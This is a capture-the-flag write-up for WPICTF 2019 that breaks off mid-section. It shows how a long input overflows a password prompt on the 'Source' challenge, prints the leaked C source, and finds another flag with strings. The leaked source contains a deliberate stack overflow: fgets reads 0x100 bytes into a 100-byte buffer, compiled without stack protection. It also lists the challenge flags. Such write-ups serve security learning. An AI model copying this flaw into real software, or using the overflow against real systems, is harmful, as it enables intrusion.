Source
--------------
Never had any experience with pwn without having a binary file (Also my first successful pwn challenge), however, I figured it worked out the same way as most binary exploitation did.
When we write a couple of passwords to the file, it always seem to show "Pass auth failed.", and close out of the shell.
![](https://raw.githubusercontent.com/Immobility/CTF/master/wpiCTF/photos/Screenshot%20at%202019-04-16%2015-05-45.png)

However, when we type spam more characters, such as:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The only output seems to be "Connection to source.wpictf.xyz closed." So that seemed suspicious, which felt like an overflow error, which shouldn't be too possible if the program is secure.
So I decided to brute-force my way in by determining the right amount of ```A```'s I should be writing until I make my way in, which were 111 A's, or 
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Which outputs
```
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>

//compiled with gcc source.c -o source -fno-stack-protector -no-pie
//gcc (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0

//flag for source1 is WPI{Typos_are_GrEaT!}
int getpw(void){
        int res = 0;
        char pw[100];

        fgets(pw, 0x100, stdin);
        *strchrnul(pw, '\n') = 0;
        if(!strcmp(pw, getenv("SOURCE1_PW"))) res = 1;
        return res;
}

char *lesscmd[] = {"less", "source.c", 0};
int main(void){
        setenv("LESSSECURE", "1", 1);
        printf("Enter the password to get access to https://www.imdb.com/title/tt0945513/\n");
        if(!getpw()){
                printf("Pasword auth failed\nexiting\n");
                return 1;
        }

        execvp(lesscmd[0], lesscmd);
        return 0
}
```
Thus, our flag is ``` WPI{Typos_are_GrEaT!} ```

-------------

Reverse
-------------

When executing the program, it worked the same way as the ```strings``` command would do. But what if we strings the file?
![](https://raw.githubusercontent.com/Immobility/CTF/master/wpiCTF/photos/Screenshot%20at%202019-04-16%2015-23-47.png)

Ooh!, so our flag is ```WPI{What_do_you_mean_I_SEE_AHH_SKI}```

-------------

jocipher
_____________

After gettubg the required file, that shows ...
